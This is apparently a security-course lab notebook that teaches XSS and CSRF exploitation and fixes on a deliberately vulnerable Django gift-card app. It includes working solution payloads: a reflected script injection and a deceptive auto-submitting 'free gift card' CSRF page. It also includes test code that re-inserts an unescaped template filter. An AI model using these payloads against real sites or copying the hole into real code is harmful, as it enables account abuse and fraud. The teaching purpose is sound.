#!/usr/bin/env python3

# %%
"""
# W2D4 - Application Security

Today you'll dive deep into the world of web application security by learning about common vulnerabilities that plague modern web applications. You'll implement real-world attack techniques, understand how they work, and learn defensive strategies to protect web applications from malicious exploitation.

**SECURITY AND ETHICAL NOTICE**: The techniques you'll learn today are powerful and potentially dangerous. You must:
- Only practice on systems you own or have explicit written permission to test
- Never use these techniques against production systems without authorization
- Follow responsible disclosure practices if you discover vulnerabilities
- Understand that misuse of these techniques may violate laws and terms of service
- Use this knowledge to build better defenses, not to cause harm

This lab will teach you the fundamental attack vectors against web applications, giving you deep insight into both their vulnerabilities and the defensive measures needed to protect them. You'll work with a realistic scenario where poor contractor work has left a gift card system riddled with security flaws that could cost your company millions in losses and regulatory penalties.

<!-- toc -->

## Content & Learning Objectives

### 1️⃣ Cross-Site Scripting (XSS) Attacks
Learn to exploit and fix XSS vulnerabilities in web templates and understand the impact of malicious script injection.

> **Learning Objectives**
> - Understand how XSS attacks work and their different types (Reflected, Stored, DOM-based)
> - Identify vulnerable template code that uses unsafe filters
> - Implement proper output escaping and Content Security Policy (CSP)
> - Learn about XSS prevention techniques and secure coding practices

### 2️⃣ Cross-Site Request Forgery (CSRF) Exploitation
Explore CSRF attacks and implement comprehensive token-based protection mechanisms.

> **Learning Objectives**
> - Create malicious HTML that performs CSRF attacks against authenticated users
> - Understand the impact of CSRF vulnerabilities on user accounts and data
> - Implement CSRF tokens and middleware protection in Django applications
> - Learn about SameSite cookies and other CSRF prevention techniques

### 3️⃣ Server-Side Request Forgery (SSRF) Attacks
Exploit SSRF vulnerabilities to access internal services and implement proper URL validation.

> **Learning Objectives**
> - Perform SSRF attacks against internal endpoints and cloud metadata services
> - Understand the risks of unvalidated URL requests and internal network exposure
> - Implement proper URL whitelisting and network segmentation
> - Learn about SSRF prevention techniques and secure architecture patterns

### 4️⃣ SQL Injection Vulnerabilities
Exploit SQL injection vulnerabilities and implement parameterized queries for secure database access.

> **Learning Objectives**
> - Craft SQL injection payloads to extract sensitive data and bypass authentication
> - Understand how raw SQL queries can be exploited and manipulated
> - Use Django ORM and parameterized queries to prevent SQL injection
> - Learn about advanced SQL injection techniques and detection methods

### 5️⃣ Command Injection Attacks
Exploit command injection vulnerabilities and implement comprehensive input validation.

> **Learning Objectives**
> - Execute arbitrary system commands through vulnerable input fields
> - Understand the risks of unsanitized user input in system command execution
> - Implement proper input validation, sanitization, and sandboxing
> - Learn about command injection prevention and secure system interaction

## SETUP

### Scenario Context

Your AI company hired external contractors to migrate their legacy gift card system to a modern Django-based web application. Unfortunately, the contractors have introduced multiple critical security vulnerabilities that could result in significant financial losses and data breaches. You have been assigned to review the code, identify the vulnerabilities, and implement proper security fixes before the system goes into production.

- Start with thorough code review to understand the application's logic
- Test each vulnerability in isolation before implementing fixes
- Document your progress and findings as you go
- Consider how fixes might interact with each other
- Always verify fixes don't break legitimate functionality

Remember: Security isn't just about fixing vulnerabilities - it's about understanding why they exist and how to prevent them in the future. Take time to understand each issue thoroughly before implementing fixes.

### Environment Requirements

This lab requires a Django-based web application environment with specific Python libraries for web security testing and exploitation. The exercises work with a vulnerable gift card application that demonstrates real-world security flaws commonly found in production systems.

<details>
<summary>Python Environment Setup (skip if using devcintainer)</summary>
```bash
# Install and configure pyenv for Python version management
brew install pyenv

# Add pyenv to your shell path
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(pyenv init -)"' >> ~/.zshrc

# Install and set Python 3.11.9
pyenv install 3.11.9
pyenv local 3.11.9
python --version

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate
```
</details>

#### Install python requirements
```bash
pip3 install -r requirements.txt
```

#### Django Application Setup

```bash
# Set up Django database and migrations
python3 manage.py makemigrations LegacySite
python3 manage.py migrate
python3 manage.py shell -c 'import import_dbs'

# Generate test fixtures for consistent testing
mkdir -p LegacySite/fixtures
python3 manage.py dumpdata LegacySite --indent=4 > LegacySite/fixtures/testdata.json

# Start the development server
python3 manage.py runserver

# Run your test solution
python3 w2d4_solution.py

```

### Application Architecture

The lab uses a Django-based gift card application with the following components:
- **Frontend**: HTML templates with potential XSS vulnerabilities
- **Backend**: Django views with various security flaws
- **Database**: SQLite database with user accounts and gift card data
- **Authentication**: Session-based authentication system

### More Readings

- **Overview**
  - OWASP Top 10 (latest): https://owasp.org/www-project-top-ten/
  - PortSwigger Web Security Academy: https://portswigger.net/web-security
- **XSS**
  - OWASP XSS: https://owasp.org/www-community/attacks/xss/
  - MDN Content Security Policy (CSP): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **CSRF**
  - OWASP CSRF: https://owasp.org/www-community/attacks/csrf
  - Django CSRF protection: https://docs.djangoproject.com/en/stable/ref/csrf/
- **SSRF**
  - PortSwigger SSRF: https://portswigger.net/web-security/ssrf
  - AWS IMDS background: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- **SQL Injection**
  - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
  - Django ORM (QuerySets): https://docs.djangoproject.com/en/stable/topics/db/queries/
- **Command Injection**
  - OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
  - Python subprocess security: https://docs.python.org/3/library/subprocess.html#security-considerations

## Understanding Web Application Security

Before diving into specific attack techniques, let's understand the current web security landscape and why these vulnerabilities matter.

### The Web Security Threat Model

Web applications face unique security challenges that affect millions of users:

**Input-Based Attacks**:
- **Cross-Site Scripting (XSS)**: Malicious scripts injected into web pages
- **SQL Injection**: Database queries manipulated through user input
- **Command Injection**: System commands executed through vulnerable inputs

**Request-Based Attacks**:
- **Cross-Site Request Forgery (CSRF)**: Unauthorized actions on behalf of users
- **Server-Side Request Forgery (SSRF)**: Unauthorized server-side requests
- **HTTP Parameter Pollution**: Manipulation of HTTP parameters

**Session and Authentication Attacks**:
- **Session Hijacking**: Stealing user session tokens
- **Authentication Bypass**: Circumventing login mechanisms
- **Privilege Escalation**: Gaining unauthorized access levels

### Real-World Web Security Incidents

Come back to this section after today, all of these are very good example you should read at some point!

Below are brief case studies tied to the vulnerabilities you'll practice in this lab:

- British Airways / Magecart skimming (2018) — Supply-chain XSS on a third-party script enabled skimming of ~380k payment transactions.
  https://brightsec.com/blog/xss-attack/

- MySpace "Samy" worm (2005) — Stored XSS worm auto-propagated to over 1M profiles in ~20 hours.
  https://www.vice.com/en/article/the-myspace-worm-that-changed-the-internet-forever/

- Capital One (2019) — SSRF to AWS instance metadata enabled credential theft and data exfiltration from >100M customer records.
  https://www.greynoise.io/blog/new-ssrf-exploitation-surge

- BookStack v23.10.2 (CVE-2023-6199) — Blind SSRF allowed retrieval of local files by users with write access.
  https://www.greynoise.io/blog/new-ssrf-exploitation-surge

- TalkTalk (2015) — SQL injection in legacy pages exposed data of 156,959 customers, incl. bank details.
  https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-icos-investigation-unfolded/

- Sony Pictures (2011) — Simple SQL injection led to widespread user data exfiltration.
  https://www.bbc.com/news/business-13636704

- Equifax (2017) — Apache Struts RCE (CVE-2017-5638) via crafted Content-Type header; patch existed months earlier.
  https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html

- TikTok (2020) — CSRF in messaging flows enabled one-click actions that could lead to account compromise.
  https://www.imperva.com/blog/imperva-red-team-discovers-vulnerability-in-tiktok-that-can-reveal-user-activity-and-information/

- ING Direct (2008) — CSRF enabled unauthorized fund transfers despite SSL; highlighted need for tokens and SameSite.
  https://www.wired.com/2008/09/scripting-attacks-make-even-the-largest-sites-vulnerable

### The OWASP Top 10

The Open Web Application Security Project (OWASP) maintains a list of the most critical web application security risks:

1. **Injection Flaws**: SQL, NoSQL, OS, and LDAP injection
2. **Broken Authentication**: Session management and authentication flaws
3. **Sensitive Data Exposure**: Inadequate protection of sensitive information
4. **XML External Entities (XXE)**: XML processing vulnerabilities
5. **Broken Access Control**: Authorization and access control failures
6. **Security Misconfiguration**: Insecure default configurations
7. **Cross-Site Scripting (XSS)**: Script injection vulnerabilities
8. **Insecure Deserialization**: Object deserialization flaws
9. **Using Components with Known Vulnerabilities**: Outdated libraries and frameworks
10. **Insufficient Logging & Monitoring**: Inadequate security monitoring

### Why This Matters

Understanding web application security is crucial because:

1. **Widespread Impact**: Web vulnerabilities can affect millions of users simultaneously
2. **Financial Consequences**: Data breaches cost organizations millions in damages
3. **Regulatory Requirements**: Laws like GDPR and CCPA mandate security measures
4. **Professional Responsibility**: Developers must understand security implications
5. **Evolving Threat Landscape**: New attack techniques emerge constantly

<details>
<summary>Vocabulary: Web Security Terms</summary>

- **XSS (Cross-Site Scripting)**: Injection of malicious scripts into web pages viewed by other users
- **CSRF (Cross-Site Request Forgery)**: Unauthorized actions performed on behalf of authenticated users
- **SSRF (Server-Side Request Forgery)**: Making unauthorized requests from the server to internal or external resources
- **SQL Injection**: Manipulating database queries through malicious input to access or modify data
- **Command Injection**: Executing arbitrary system commands through vulnerable input fields
- **OWASP**: Open Web Application Security Project - maintains top 10 web vulnerabilities and security standards
- **Same-Origin Policy**: Browser security model that restricts cross-origin requests and resource access
- **Content Security Policy (CSP)**: HTTP header that helps prevent XSS attacks by controlling resource loading
- **Session Token**: Unique identifier used to maintain user authentication state across requests
- **CSRF Token**: Random value that proves a request came from the legitimate user and not a malicious site
- **Parameterized Query**: Database query that separates SQL code from data to prevent injection attacks
- **Input Validation**: Process of checking user input for malicious or unexpected content
- **Output Encoding**: Converting special characters to prevent them from being interpreted as code
- **Privilege Escalation**: Gaining higher access levels than originally authorized
- **Security Misconfiguration**: Insecure settings or default configurations that create vulnerabilities

</details>
"""

# w2d4_answers.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'GiftcardSite.settings')
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command

# %%

"""
## Exercise 1: Cross-Site Scripting (XSS) Vulnerability Exploitation

Cross-Site Scripting (XSS) represents one of the most prevalent and dangerous web application security vulnerabilities, arising from the web's original design philosophy that trusted all content sources equally. The vulnerability exploits the inherent trust relationship between a user and a website, allowing attackers to bypass the same-origin policy that serves as a cornerstone of web security. When a web application fails to properly validate, sanitize, or escape user input before incorporating it into HTML responses, it creates an opportunity for malicious actors to inject arbitrary client-side scripts that execute within the context of the victim's browser session.

The theoretical foundation of XSS attacks rests on how modern web browsers cannot distinguish between legitimate scripts intended by the application developer and malicious scripts injected by an attacker, provided both are delivered through the same trusted domain. This exploitation vector leverages the dynamic nature of modern web applications, where user-supplied data frequently becomes part of the HTML structure, CSS styling, or JavaScript execution context. The attack surface expands significantly in applications that implement rich user interactions, real-time content updates, and personalized experiences, as these features often require extensive client-server data exchange and dynamic content generation.

There are three main types of XSS:
1. **Reflected XSS**: The malicious script is reflected off the web server, such as in an error message or search result
2. **Stored XSS**: The malicious script is permanently stored on the target server (in a database, message forum, etc.)
3. **DOM-based XSS**: The vulnerability exists in client-side code rather than server-side code

Real-world examples:
- British Airways / Magecart skimming attack (2018): Attackers exploited an XSS vulnerability in a JavaScript library (Feedify) used on British Airways, injecting malicious scripts to skim credit card details from approximately 380,000 booking transactions before the breach was discovered.
[https://brightsec.com/blog/xss-attack/](https://brightsec.com/blog/xss-attack/)

- MySpace "Samy" worm (2005): One of the most famous XSS worms ever, Samy Kamkar’s script added himself as a friend on profiles of users who visited his infected MySpace page. Within 20 hours, over one million profiles were compromised, bringing the site to a crawl.
[https://www.vice.com/en/article/the-myspace-worm-that-changed-the-internet-forever/](https://www.vice.com/en/article/the-myspace-worm-that-changed-the-internet-forever/)

Recommended readings:
- Django templates auto-escape: https://docs.djangoproject.com/en/stable/ref/templates/language/#automatic-html-escaping
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS labs: https://portswigger.net/web-security/cross-site-scripting
- MDN CSP overview: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP


<details>
<summary>Hint: If you aren't sure what XSS is</summary>
When websites display information that came from outside sources and don't treat it purely as text, that information might be interpreted by the browser as active script. This can lead to actions happening in a user's session or information from the page being accessed by that script. The big idea is that untrusted data should remain data, not code, and modern browsers can be guided to limit script behavior.

Auto-escaping is enabled by default in Django templates, so variables (e.g., `{{ name }}`) are HTML-escaped to mitigate XSS.
Disable selectively with `|safe` for a variable or `{% autoescape off %}...{% endautoescape %}` for a block; string literals aren't auto-escaped.
</details>

In this exercise, we'll exploit a reflected XSS vulnerability in the director parameter of a gift card application.
Look at the `templates/*.html` files which are used to render the application.

<details>
<summary>Vocabulary: XSS Terms</summary>

- **XSS (Cross-Site Scripting)**: A vulnerability that allows injection of malicious scripts into web pages
- **Payload**: The malicious code that gets executed in the victim's browser
- **Reflected XSS**: XSS where the payload is immediately returned in the response
- **DOM**: Document Object Model - the structure of HTML elements in a web page
- **Escaping**: Converting special characters to prevent them from being interpreted as code

</details>

### Exercise 1a - implement exploit_xss_vulnerability

> **Difficulty**: 🔴🔴⚪⚪⚪  
> **Importance**: 🔵🔵🔵🔵⚪
> 
> You should spend up to ~15 minutes on this exercise.

<details>

Start by trying a XSS attack on the website at http://localhost:8000 without looking at the source code. After you have a working attack, implement the `exploit_xss_vulnerability` function below to test your implementation:

1. Implement the `exploit_xss_vulnerability` function that demonstrates how to exploit an XSS vulnerability by injecting malicious JavaScript appropriately.
2. Figure out what part(s) of the code are on the path which makes this possible by looking at the source code.
</details>
"""

def exploit_xss_vulnerability():
    """
    Exploit XSS vulnerability by injecting malicious script into director parameter.
    
    Args:
        None
        
    Returns:
        bool: True if XSS payload was successfully injected, False otherwise
    """
    from django.test import Client
    from django.conf import settings
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    client = Client()
    if "SOLUTION":
        xss_payload = '<script>alert("XSS Attack!")</script>'
        
        # Test the vulnerable endpoint
        response = client.get(f'/buy/6?director={xss_payload}')
    else:
        # TODO: Create XSS payload and test vulnerable endpoint
        # - Create a malicious JavaScript payload
        # - Replace the current response endpoint with the vulnerable one
        response = client.get(f'/buy/1')
    
    print(f"XSS exploit response status: {response.status_code}")
    
    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False

def test_exploit_xss_vulnerability(exploit_xss_vulnerability):
    """Test XSS vulnerability exploitation"""
    files = ["templates/gift.html", "templates/item-single.html"]
    backups = {}
    
    try:
        # Store original content (vulnerable state)
        for file_path in files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    backups[file_path] = f.read()
        
        # Ensure templates are in vulnerable state (with |safe filter)
        vulnerable_pattern = '{{ director|safe }}'
        for file_path in files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read()
                
                # If not vulnerable, make it vulnerable for testing
                if '{{ director }}' in content and '{{ director|safe }}' not in content:
                    content = content.replace('{{ director }}', '{{ director|safe }}')
                    with open(file_path, 'w') as f:
                        f.write(content)
                    print(f"Made {file_path} vulnerable for testing")
        
        # Clear template cache
        from django.template import engines
        for engine in engines.all():
            if hasattr(engine, 'engine'):
                for loader in engine.engine.template_loaders:
                    if hasattr(loader, 'reset'):
                        loader.reset()
        
        # Test the exploit
        exploit_result = exploit_xss_vulnerability()
        
        if exploit_result:
            print("✓ XSS vulnerability test passed - exploit successful")
        else:
            print("⚠ XSS vulnerability test - exploit may have failed or been blocked")
        
        return exploit_result
        
    except Exception as e:
        print(f"Error during XSS exploit test: {e}")
        return False
        
    finally:
        # Restore original content
        for file_path, original_content in backups.items():
            if original_content:
                with open(file_path, 'w') as f:
                    f.write(original_content)
                print(f"Restored original state in {file_path}")

if __name__  == '__main__':
    test_exploit_xss_vulnerability(exploit_xss_vulnerability)

# %%
"""
### Exercise 1b - implement fix_xss_vulnerability

> **Difficulty**: 🔴🔴⚪⚪⚪  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~10 minutes on this exercise.

Its now your job to clean up the mess.

Fix the XSS vulnerability by removing the unsafe filter from Django templates.
The vulnerability exists because Django templates use a filter on user input, which disables HTML escaping. By removing this filter, Django will automatically escape special characters like < and > to prevent script injection.
Editing this function is optional as long as you fix the vulnerability in the templates.
Good incremental outcomes: Identify where unsafe rendering happens; harden one template or component; add a simple check that ensures dangerous characters are encoded in responses.
"""

def fix_xss_vulnerability():
    """
    Fix XSS vulnerability by finding discepencies.
    You can do it manually or edit the front end code.
    
    Args:
        None
        
    Returns:
        None
    """
    if "SOLUTION":
        files = ["templates/gift.html", "templates/item-single.html"]
        pattern = r'\{\{\s*director\s*\|\s*safe\s*\}\}'
        
        for file_path in files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read()
                if re.search(pattern, content):
                    with open(file_path, 'w') as f:
                        f.write(re.sub(pattern, '{{ director }}', content))
                    print(f"Fixed {file_path}")
    else:
        # TODO: Look for |safe filter in templates
        # - What does `|` mean in this case
        # - You can do it manually or use re.search within the code 
        pass

"""
<details>
<summary>Hints</summary>

1. Look at: gift.html and item-single.html
2. What does `{{ director|safe }}` mean?
3. |safe filter: Django template filter that marks content as safe (disables escaping)

</details>
"""

def test_fix_xss_vulnerability(fix_xss_vulnerability):
    """Test for XSS vulnerability in the director parameter"""
    from django.test import Client
    from django.conf import settings
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    # The vulnerable URL with XSS payload
    files = ["templates/gift.html", "templates/item-single.html"]
    backups = {}
    
    try:
        # Store original content (vulnerable state)
        for file_path in files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    backups[file_path] = f.read()
        
        # Apply the fix
        fix_xss_vulnerability()
        
        for engine in engines.all():
            if hasattr(engine, 'engine'):  # Django template backend
                # Reset each loader, not the engine itself
                for loader in engine.engine.template_loaders:
                    if hasattr(loader, 'reset'):
                        loader.reset()
                
        # Test that the fix works
        client = Client()
        xss_payload = '<script>alert("hello")</script>'
        
        response = client.get(f'/buy/6?director={xss_payload}')
        
        print(f"Response status code: {response.status_code}")
        
        # Check that we got some response (might be 400, 404, etc. depending on the app state)
        if response.status_code == 200:
            # In a fixed app, it would be escaped (e.g., &lt;script&gt;)
            response_content = response.content.decode()
            if xss_payload not in response_content:
                print("XSS vulnerability test passed - payload was properly escaped")
                if '&lt;script&gt;' in response_content:
                    print("Confirmed: Script tags are properly escaped")
            else:
                print("WARNING: XSS payload found unescaped in response!")
        else:
            print(f"Request failed with status {response.status_code}, but fix was applied to templates")
        
    except Exception as e:
        print(f"Error during test: {e}")
        
    finally:
        # Restore the original vulnerable state
        for file_path in files:
            if file_path in backups:
                with open(file_path, 'w') as f:
                    f.write(backups[file_path])
                print(f"Restored vulnerable state in {file_path}")

if __name__ == '__main__':
    print("\nTesting XSS vulnerability fix...")
    test_fix_xss_vulnerability(fix_xss_vulnerability)
# %%
"""
## Exercise 2: Cross-Site Request Forgery (CSRF) Vulnerability

Cross-Site Request Forgery (CSRF) represents a sophisticated attack vector that exploits the fundamental trust relationship between web browsers and authenticated user sessions. Unlike other web vulnerabilities that focus on data theft or unauthorized access, CSRF attacks specifically target the integrity of state-changing operations by leveraging the browser's automatic inclusion of authentication credentials in cross-origin requests.

The attack works by tricking the victim's browser into making a request to a vulnerable application using the victim's existing session cookies. When a user visits a malicious website or clicks a crafted link while logged into another application, their browser automatically sends their authentication credentials along with the forged request. This allows attackers to perform actions on behalf of the victim without their knowledge or consent.

What makes CSRF particularly dangerous is its invisibility to the victim. The attack doesn't require stealing passwords or breaking encryption. Instead, it simply relies on the browser's normal behavior of including cookies with requests. This means users can be completely unaware that their accounts have been compromised, making CSRF a persistent threat that requires proper server-side validation and anti-CSRF tokens to prevent.

Real-world examples:
- ING Direct (2008): Researchers uncovered a CSRF vulnerability in ING Direct's banking website that allowed attackers to initiate unauthorized money transfers from a user's account—even while secured over SSL and without any visual sign to the user. 
[https://www.wired.com/2008/09/scripting-attacks-make-even-the-largest-sites-vulnerable](https://www.wired.com/2008/09/scripting-attacks-make-even-the-largest-sites-vulnerable)

- TikTok (2020): A CSRF vulnerability in TikTok allowed attackers to send messages with malware and trigger CSRF or XSS attacks—potentially enabling account takeover via crafted one-click operations. The issue was reportedly patched within three weeks.
[https://www.imperva.com/blog/imperva-red-team-discovers-vulnerability-in-tiktok-that-can-reveal-user-activity-and-information/](https://www.imperva.com/blog/imperva-red-team-discovers-vulnerability-in-tiktok-that-can-reveal-user-activity-and-information/)

Recommended readings:
- Django CSRF protection: https://docs.djangoproject.com/en/stable/ref/csrf/
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- PortSwigger CSRF: https://portswigger.net/web-security/csrf
- MDN SameSite cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

Browsers automatically include credentials when communicating with sites you're signed into. Public resources describe how a separate page can cause the browser to send a request to another site where you're logged in, making it appear as if you initiated that action. Applications confirm user intent and reduce exposure to cross-site requests. The core concept: important actions shouldn't rely solely on the browser sending a request.

<details>
<summary>Vocabulary: CSRF Terms</summary>

- **CSRF (Cross-Site Request Forgery)**: Attack that tricks users into performing unwanted actions
- **State-changing request**: HTTP requests that modify data (POST, PUT, DELETE)
- **Session cookies**: Cookies that maintain user authentication state
- **CSRF token**: Random value that proves the request came from the legitimate user
- **SameSite cookie**: Cookie attribute that helps prevent CSRF attacks
- **Referer header**: HTTP header indicating the page that made the request

</details>

### Exercise 2a - implement exploit_csrf_vulnerability

> **Difficulty**: 🔴🔴🔴⚪⚪  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~20 minutes on this exercise.

Again the code written by the devs is lax just like their CSRF protection.

Create a malicious HTML page to perform a CSRF attack against the gift card application. The HTML page can be hosted on a separate server.
Treat the current gift card website as a blackbox but take note of the gifting endpoints. 

Goal of the CSRF attack: Given that a *user* (could be any user) is logged in, `test2` is being gifted a card from that *user* when they visit the malicious page.
Once you know that the attack is successful, come back and paste the malicious HTML in `exploit_csrf_vulnerability`.

<details>
<summary>Hint: Intermediate steps</summary>
1. Find a state-changing operation susceptible to cross-origin triggering
2. Understand cookie behavior observed during the attempt.
</details>
"""

def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.
    
    Args:
        None
        
    Returns:
        str: HTML content that performs the CSRF attack
    """
    if "SOLUTION":
        return """<!DOCTYPE html>
<html>
<head>
    <title>Win a Free Electronics Card!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #51be78;
        }
        .loading {
            margin: 20px 0;
            font-style: italic;
            color: #666;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body onload="document.getElementById('giftForm').submit();">
    <div class="container">
        <h1>Win a Free Electronics Card!</h1>
        <p>Congratulations! You've been selected to receive a $500 Electronics Card!</p>
        <p class="loading">Processing your gift card, please wait...</p>
        
        <form id="giftForm" action="http://localhost:8000/gift/5" method="GET" class="hidden">
            <input type="hidden" name="username" value="test2">
            <input type="hidden" name="amount" value="500">
        </form>
    </div>
    
    <script>
        // Store the referrer before submitting the form
        var originalReferrer = document.referrer;
        
        // Submit the form
        window.onload = function() {
            var form = document.getElementById('giftForm');
            form.submit();
            
            // Set a slightly longer timeout to ensure the gift operation completes
            setTimeout(function() {
                if(originalReferrer) {
                    window.location.href = '/';
                } else {
                    // Fallback if no referrer
                    window.location.href = "http://localhost:8000/";
                }
            }, 3000); // 3 seconds should be enough for the operation to complete
        }
    </script>
    
</body>
</html>"""
    else:
        # TODO: Create malicious HTML that performs CSRF attack
        # - Create an HTML page that appears legitimate
        # - Include a hidden form targeting the gift card endpoint
        # - Add JavaScript to automatically submit the form
        # - Give user "test2" a gify card
        return "<html><body><h1>CSRF Vulnerability</h1></body></html>"

def test_exploit_csrf_vulnerability(exploit_csrf_vulnerability):
    """Test CSRF vulnerability by simulating the attack and verifying card creation"""

    # Backup the database before running test
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'

    try:
        # Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")
        
        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
            # Continue with existing data if loading fails

        from django.test import Client
        from django.conf import settings
        
        # Add testserver to ALLOWED_HOSTS if not already there
        if 'testserver' not in settings.ALLOWED_HOSTS:
            settings.ALLOWED_HOSTS.append('testserver')
        
        # Create a client and set up test user
        client = Client()
        username, password = 'test5', 'test5'
        
        # Register and login test user
        def register_user(client, username, password):
            # Check if user already exists
            try:
                from LegacySite.models import User
                existing_user = User.objects.get(username=username)
                print(f"User '{username}' already exists, skipping registration")
                can_login = client.login(username=username, password=password)
                return can_login
            except User.DoesNotExist:
                # User doesn't exist, proceed with registration
                endpoint = '/register'
                data = {'uname': username,
                        'pword': password, 
                        'pword2': password}
                client.post(path=endpoint, data=data)
                can_login = client.login(username=username, password=password)
                return can_login

        
        # Set up the test user
        register_user(client, username, password)
        client.login(username=username, password=password)
        
        # Get the malicious HTML content
        html_content = exploit_csrf_vulnerability()
        
        # Extract parameters from HTML
        import re
        action_match = re.search(r'action="([^"]+)"', html_content)
        username_match = re.search(r'name="username" value="([^"]+)"', html_content)
        amount_match = re.search(r'name="amount" value="([^"]+)"', html_content)
        
        assert action_match is not None, "Could not find action URL in HTML"
        assert username_match is not None, "Could not find username parameter in HTML"
        assert amount_match is not None, "Could not find amount parameter in HTML"
        
        action_url = action_match.group(1)
        username_value = username_match.group(1)
        amount_value = amount_match.group(1)
        
        # Extract the gift endpoint path from the full URL
        gift_path = action_url.replace('http://localhost:8000', '')
        
        print(f"\nTesting CSRF vulnerability by simulating the attack...")
        print(f"Gift endpoint: {gift_path}")
        print(f"Username: {username_value}")
        print(f"Amount: {amount_value}")
        
        # Verify username is test2
        assert username_value == "test2", "Username must be test2"
        
        # Ensure test2 user exists (create if necessary)
        test2_user = User.objects.get(username="test2")
        
        initial_card_count = Card.objects.filter(user=test2_user).count()
        print(f"Initial card count for test2: {initial_card_count}")
        
        # Make sure we're logged in as the victim (test/test)
        # The CSRF attack happens when the victim (test) visits the malicious page
        print(f"Performing CSRF attack while logged in as: {username}")
        
        # Simulate the CSRF attack by making the GET request as the logged-in victim
        print(f"Simulating CSRF attack: GET {gift_path}?username={username_value}&amount={amount_value}")
        response = client.get(gift_path, {'username': username_value, 'amount': amount_value})
        
        print(f"Response status code: {response.status_code}")
        
        # Check if new card was created for test2 (the beneficiary)
        final_card_count = Card.objects.filter(user=test2_user).count()
        print(f"Final card count for test2: {final_card_count}")
        
        if final_card_count > initial_card_count:
            # Get the newest card
            new_card = Card.objects.filter(user=test2_user).order_by('-id').first()
            print(f"[+] CSRF Attack SUCCESS! New card created:")
            print(f"    Card ID: {new_card.id}")
            print(f"    Card User: {new_card.user.username}")
            print(f"    Card Used: {new_card.used}")
            
            # Try to decode card data if possible
            try:
                card_data = new_card.data.decode('utf-8')
                card_data_dict = json.loads(card_data)
                print(f"    Card Data: {card_data}")
                if 'total_value' in card_data_dict:
                    print(f"    Card Value: {card_data_dict['total_value']}")
            except:
                print(f"    Card Data: {new_card.data}")
            
            print(f"✓ CSRF vulnerability successfully exploited!")
            print(f"✓ HTML would execute: {gift_path}?username={username_value}&amount={amount_value}")
            print(f"✓ New card added to user test2")
            
        else:
            print("[-] CSRF attack may have failed or endpoint doesn't exist")
            print(f"    Expected: Card count to increase from {initial_card_count}")
            print(f"    Actual: Card count remained {final_card_count}")
            print(f"    This could mean:")
            print(f"    1. The {gift_path} endpoint doesn't exist")
            print(f"    2. CSRF protection is working")
            print(f"    3. The endpoint requires different parameters")
            
            # Still pass the test if HTML structure is correct
            assert 'name="username" value="test2"' in html_content, "HTML must target test2"
            print("✓ HTML structure is correct even if endpoint doesn't work")
            
        print("✓ CSRF vulnerability test completed!")
        return True

    finally:
        # Always restore the original database
        if os.path.exists(backup_path):
            shutil.move(backup_path, db_path)
            print(f"✓ Database restored from backup")

if __name__ == '__main__':
    print("\nTesting CSRF vulnerability exploitation...")
    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)
"""
### Exercise 2b - implement fix_csrf_vulnerability

> **Difficulty**: 🔴🔴🔴🔴⚪  
